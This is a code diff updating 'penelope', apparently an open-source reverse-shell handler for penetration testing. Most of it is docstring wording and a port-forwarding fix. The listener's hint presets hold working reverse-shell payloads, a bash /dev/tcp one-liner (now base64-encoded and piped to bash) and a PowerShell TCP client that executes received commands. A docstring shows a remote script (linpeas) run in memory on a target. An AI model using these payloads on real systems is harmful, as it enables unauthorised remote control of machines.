@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.12.9"
+__version__ = "0.12.10"
 
 import os
 import io
@@ -752,13 +752,13 @@ class MainMenu(BetterCMD):
 	@session(current=True)
 	def do_portfwd(self, line):
 		"""
-		[host]:[port] (<-|->) host:port
+		host:port(<-|->)host:port
 		Local and Remote port forwarding
 
 		Examples:
 
-			-> 192.168.0.1:80		Forward the localhost:80 to 192.168.0.1:80
-			0.0.0.0:8080 -> 192.168.0.1:80	Forward the 0.0.0.0:8080 to 192.168.0.1:80
+			-> 192.168.0.1:80		Forward 127.0.0.1:80 to 192.168.0.1:80
+			0.0.0.0:8080 -> 192.168.0.1:80	Forward 0.0.0.0:8080 to 192.168.0.1:80
 		"""
 		if not line:
 			logger.warning("No parameters...")
@@ -864,7 +864,7 @@ class MainMenu(BetterCMD):
 	def do_upload(self, local_items):
 		"""
 		<glob|URL>...
-		Upload files / folders / HTTP(S)/FTP(S) URLs to the target.
+		Upload files / folders / HTTP(S)/FTP(S) URLs to the target
 		HTTP(S)/FTP(S) URLs are downloaded locally and then pushed to the target. This is extremely useful
 		when the target has no Internet access
 
@@ -885,7 +885,7 @@ class MainMenu(BetterCMD):
 	def do_script(self, local_item):
 		"""
 		<local_script|URL>
-		Execute a local script or URL from memory in the target and get the output in a local file
+		In-memory local or URL script execution & real time downloaded output
 
 		Examples:
 			script https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
@@ -987,7 +987,7 @@ class MainMenu(BetterCMD):
 	def do_upgrade(self, ID):
 		"""
 
-		Upgrade the current session's shell to PTY.
+		Upgrade the current session's shell to PTY
 		Note: By default this is automatically run on the new sessions. Disable it with -U
 		"""
 		core.sessions[self.sid].upgrade()
@@ -995,7 +995,7 @@ class MainMenu(BetterCMD):
 	def do_dir(self, ID):
 		"""
 		[SessionID]
-		Open the selected session's local folder. If no session is selected, open the base folder
+		Open the session's local folder. If no session specified, open the base folder
 		"""
 		folder = core.sessions[self.sid].directory if self.sid else options.basedir
 		Open(folder)
@@ -1203,7 +1203,7 @@ class MainMenu(BetterCMD):
 	def do_SET(self, line):
 		"""
 		[option, [value]]
-		Show / set option values.
+		Show / set option values
 
 		Examples:
 
@@ -1686,7 +1686,7 @@ class Listener:
 	def hints(self):
 
 		presets = [
-			"bash -c 'exec bash >& /dev/tcp/{}/{} 0>&1 &'",
+			"bash >& /dev/tcp/{}/{} 0>&1",
 			'$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()' # Taken from revshells.com
 		]
 
@@ -1698,7 +1698,7 @@ class Listener:
 
 		for ip in ips:
 			output.extend(('', '➤  ' + str(paint(ip).CYAN) + ":" + str(paint(self.port).red), ''))
-			output.append(presets[0].format(ip, self.port))
+			output.append(f"echo {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash")
 			output.append("")
 			output.append("cmd /c powershell -e " + base64.b64encode(presets[1].format(ip, self.port).encode("utf-16le")).decode())
 
@@ -3411,16 +3411,16 @@ class Session:
 		return True
 
 	def portfwd(self, _type, lhost, lport, rhost, rport):
-
+		session = self
 		#print(_type, lhost, lport, rhost, rport)
 		class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
 			def handle(self):
 
 				#self.request.setblocking(False)
 
-				stdin_stream = core.sessions[1].new_streamID # TEMP
-				stdout_stream = core.sessions[1].new_streamID
-				stderr_stream = core.sessions[1].new_streamID
+				stdin_stream = session.new_streamID # TEMP
+				stdout_stream = session.new_streamID
+				stderr_stream = session.new_streamID
 
 				if not all([stdin_stream, stdout_stream, stderr_stream]):
 					return
@@ -3467,7 +3467,7 @@ class Session:
 				#stderr_stream.terminate()
 				"""
 
-				core.sessions[1].exec(
+				session.exec(
 					code,
 					python=True,
 					stdin_stream=stdin_stream,
@@ -3477,7 +3477,7 @@ class Session:
 					stdout_dst=self.request
 				)
 
-				"""threading.Thread(target=core.sessions[1].exec, args=(code, ), kwargs={
+				"""threading.Thread(target=session.exec, args=(code, ), kwargs={
 					'python': True,
 					'stdin_stream': stdin_stream,
 					'stdout_stream': stdout_stream,
